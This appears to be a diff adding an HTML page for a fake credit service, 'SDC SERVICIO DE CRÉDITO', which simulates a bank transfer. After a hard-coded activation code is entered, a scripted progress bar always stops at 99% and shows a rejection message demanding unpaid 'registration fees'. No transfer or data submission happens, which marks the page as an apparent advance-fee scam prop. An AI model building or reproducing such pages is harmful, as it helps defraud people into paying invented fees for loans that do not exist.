@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SDC SERVICIO DE CRÉDITO</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f5f8fc;
+      color: #1c1c1e;
+    }
+    header {
+      background-color: #0a3e91;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 1.2rem;
+    }
+    .container {
+      max-width: 500px;
+      margin: 2rem auto;
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+    }
+    input, select {
+      width: 100%;
+      padding: 0.8rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      background-color: #0a3e91;
+      color: white;
+      border: none;
+      padding: 0.9rem 1.5rem;
+      width: 100%;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #progress-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .progress-bar {
+      width: 80%;
+      height: 20px;
+      background: #ddd;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 2rem;
+    }
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: #0a3e91;
+      transition: width 0.3s ease;
+    }
+    .alert-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff3cd;
+      color: #856404;
+      padding: 1.5rem;
+      border-radius: 10px;
+      border: 1px solid #ffeeba;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      display: none;
+      z-index: 100;
+      max-width: 90%;
+    }
+    .alert-box button {
+      margin-top: 1rem;
+      background-color: #0a3e91;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    🏦 SDC SERVICIO DE CRÉDITO
+  </header>
+
+  <div class="container" id="form-container">
+    <h2 style="text-align:center; margin-bottom: 2rem;">Detalles del Virement</h2>
+
+    <form id="virementForm">
+      <label for="iban">IBAN / Número de Cuenta</label>
+      <input type="text" id="iban" required />
+
+      <label for="banco">Nombre del Banco</label>
+      <input type="text" id="banco" required oninput="generateCode()" />
+
+      <label for="bic">Código Banco (BIC/SWIFT)</label>
+      <input type="text" id="bic" readonly />
+
+      <label for="beneficiario">Nombre del Beneficiario</label>
+      <input type="text" id="beneficiario" required />
+
+      <label for="monto">Importe del Virement</label>
+      <input type="number" id="monto" required />
+
+      <label for="moneda">Moneda</label>
+      <select id="moneda">
+        <option value="MXN">MXN</option>
+        <option value="USD">USD</option>
+        <option value="EUR">EUR</option>
+      </select>
+
+      <label for="motivo">Motivo del Virement</label>
+      <input type="text" id="motivo" required />
+
+      <label for="code">🔒 Ingrese el código de activación del envío</label>
+      <input type="password" id="code" placeholder="*********" required />
+
+      <button type="submit">Continuar ahora</button>
+    </form>
+  </div>
+
+  <div id="progress-screen">
+    <h2>Transferencia en curso, por favor espere...</h2>
+    <div class="progress-bar">
+      <div class="progress" id="progress"></div>
+    </div>
+  </div>
+
+  <div class="alert-box" id="alert-box">
+    <strong>⚠️ Transferencia rechazada</strong>
+    <p>Faltan los <strong>gastos de registro del expediente</strong> en nuestra plataforma.</p>
+    <button onclick="closeAlert()">Cerrar</button>
+  </div>
+
+  <script>
+    function generateCode() {
+      const banco = document.getElementById('banco').value.toLowerCase();
+      const bic = document.getElementById('bic');
+      const bicCodes = {
+        'azteca': 'AZTKMXMMXXX',
+        'banorte': 'MENOMXMTXXX',
+        'santander': 'BSCHMXMMXXX',
+        'bbva': 'BCMRMXMMXXX'
+      };
+      for (const name in bicCodes) {
+        if (banco.includes(name)) {
+          bic.value = bicCodes[name];
+          return;
+        }
+      }
+      bic.value = 'N/A';
+    }
+
+    function closeAlert() {
+      document.getElementById('alert-box').style.display = 'none';
+    }
+
+    document.getElementById('virementForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const code = document.getElementById('code').value;
+      if (code !== '501304') {
+        alert('Código de activación incorrecto.');
+        return;
+      }
+
+      document.getElementById('form-container').style.display = 'none';
+      document.getElementById('progress-screen').style.display = 'flex';
+
+      let progress = 0;
+      const interval = setInterval(() => {
+        if (progress >= 99) {
+          clearInterval(interval);
+          document.getElementById('alert-box').style.display = 'block';
+        } else {
+          progress += 1;
+          document.getElementById('progress').style.width = progress + '%';
+        }
+      }, 100);
+    });
+  </script>
+</body>
+</html>
